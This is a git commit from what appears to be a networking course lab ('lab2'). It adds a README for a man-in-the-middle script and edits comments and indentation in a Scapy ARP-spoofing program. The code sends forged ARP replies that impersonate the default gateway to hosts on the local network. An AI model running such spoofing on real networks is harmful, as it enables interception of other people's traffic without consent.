2bec6942df3799074db7290b4d425d949b9b599a
Wende Tan <twd2@163.com>
2018-10-02 03:45:22 +0800

    lab2: grumble code

---
+++ lab2_mitm/README.md
@@ -0,0 +1,10 @@
+# MITM script
+
+## Usage
+
+```bash
+sudo ./setup_iptables
+./start_arp &
+./start_mitm
+```
+
--- lab2_mitm/arp.py
+++ lab2_mitm/arp.py
@@ -2,7 +2,7 @@
 import os
 import time
 
-# send arbitray arp packet to get ip and mac of gateway
+# Send an arbitray ICMP request to get IP and MAC address of the default gateway.
 p = srp1(Ether()/IP(dst='1.2.3.4', ttl=0)/ICMP()/'abcdefgh')
 
 gw_ip = p.payload.src
@@ -11,7 +11,7 @@ my_ip = p.payload.dst
 my_mac = p.dst
 
 def log(*s):
-    print(time.asctime() + ":", *s)
+  print(time.asctime() + ":", *s)
 
 log('My IP:', my_ip)
 log('My MAC:', my_mac)
@@ -20,12 +20,12 @@ log('Gateway Real MAC:', gw_mac)
 
 def packet_cb(p):
   p = p.payload
-  if p.psrc == my_ip or p.hwsrc == my_mac:
+  if p.psrc == my_ip or p.hwsrc == my_mac: # do not spoof myself
     return
-  if p.psrc == p.pdst and p.psrc == gw_ip:# Real gateway's gratuitous ARP
+  if p.psrc == p.pdst and p.psrc == gw_ip: # real gateway's gratuitous ARP
     do_reply(gw_ip, 'ff:ff:ff:ff:ff:ff') # gratuitous ARP
     return
-  if p.op != 1: # bypass who-has queries
+  if p.op != 1: # bypass queries other than who-has
     return
   if p.pdst == gw_ip:
     log('{} at {} is requesting gateway\'s MAC...'.format(p.psrc, p.hwsrc))
@@ -33,8 +33,8 @@ def packet_cb(p):
     do_reply(p.psrc, gw_mac, gw_ip) # spoof gateway
   elif p.psrc == gw_ip:
     log('Gateway is requesting {}\'s MAC...'.format(p.pdst))
-    do_reply(p.pdst, p.hwsrc, p.psrc) # reply to gateway
-    do_reply(gw_ip, 'ff:ff:ff:ff:ff:ff') # gratuitous ARP
+    do_reply(p.pdst, p.hwsrc, p.psrc) # spoof gateway
+    do_reply(gw_ip, 'ff:ff:ff:ff:ff:ff') # gratuitous ARP, spoof everyone else
 
 def do_reply(fake_ip, dst, pdst=''):
   if dst == 'ff:ff:ff:ff:ff:ff':
